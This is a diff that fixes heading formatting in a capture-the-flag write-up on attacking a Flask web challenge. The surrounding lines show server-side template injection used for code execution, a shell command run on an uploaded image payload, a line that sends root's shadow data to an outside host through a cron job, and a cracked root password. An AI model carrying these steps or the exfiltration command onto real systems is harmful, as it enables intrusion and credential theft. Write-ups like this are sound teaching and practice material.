@@ -23,7 +23,7 @@ High level executive summary of how the objective was solved. Details belong in 
 <details>
 <summary>Click to expand</summary>
 
-  ##Step One: Gain Access to web application : Leak Sensitive Information
+  ## Step One: Gain Access to web application : Leak Sensitive Information
   
 Initial discovery activities of the website uncovered the following:
    
@@ -54,7 +54,7 @@ Initial discovery activities of the website uncovered the following:
 
       ![Redirect Parameter](/images/snowblind_parameter.jpg)
     
-##Step Two: Explore SSTI and achieve RCE : Insecure Software
+## Step Two: Explore SSTI and achieve RCE : Insecure Software
 The hint indicates that the application is using Flask. There are two helpful resources for understanding SSTI:
 
 [Server Side Template Injections with Jinja2](https://onsecurity.io/article/server-side-template-injection-with-jinja2/)
@@ -124,7 +124,7 @@ The following indexes where discovered that would allow RCE:
 
 ![SSTI Enumeration](/images/snowblind_enumeration2.jpg) 
 
-##Step Three: Achieve Shell Access : Insecure File Upload
+## Step Three: Achieve Shell Access : Insecure File Upload
 
 The following payload was inserted into a file called payload.jpg and uploaded to the admin profile.
 
@@ -139,7 +139,7 @@ Selecting index 205 with get > os > popen.read() as our target, the following co
 sh /app/static/images/admin\\u005ff1f9cc53781abb79\\u002epng
 ```
 
-##Step Four: Exfilitrate Data : Insecure processes / Data Leakage
+## Step Four: Exfilitrate Data : Insecure processes / Data Leakage
 
 With initial access established, time for more recon. An interesting cron job was located in /etc/cron/cron.d/mycron. It runs a backup script every minute as root. 
 
@@ -164,7 +164,7 @@ echo "http://45-79-190-29.ip.linodeusercontent.com:8000/exfil" > /dev/shm/.frost
 
 The exfiltrated data file is located here: [Exfiltrated File](/resources/shadow_exfil.png)
 
-##Step Five:  Decode PNG file : Leak Sensitive Information
+## Step Five:  Decode PNG file : Leak Sensitive Information
 
 Since we have the backup script, we know the encryption mechanism. We also know what the first block of data encrypted is "root:$". With this information, we can decode the file.
 
@@ -174,7 +174,7 @@ The file was damaged or incomplete, so the script suppresses errors and forces t
 
 ![Decoded PNG File](/images/snowblind_decodedpng.jpg) 
 
-##Step Six: Crack Hash for Root : Weak Password 
+## Step Six: Crack Hash for Root : Weak Password 
 
 With the password hash, salt, and the algorithm used, we can attempt to crack the hash using John the Ripper and the rockyou word list.
 
@@ -182,7 +182,7 @@ With the password hash, salt, and the algorithm used, we can attempt to crack th
 
 **root password: jollyboy**
 
-##Step Seven: Escalate privileges : Escalate privileges
+## Step Seven: Escalate privileges : Escalate privileges
 
 With root password, it is a simple matter to escalate privileges using the su command. Once root, there is a bash script in the /root directory. Executing the script reveals the flag.
   
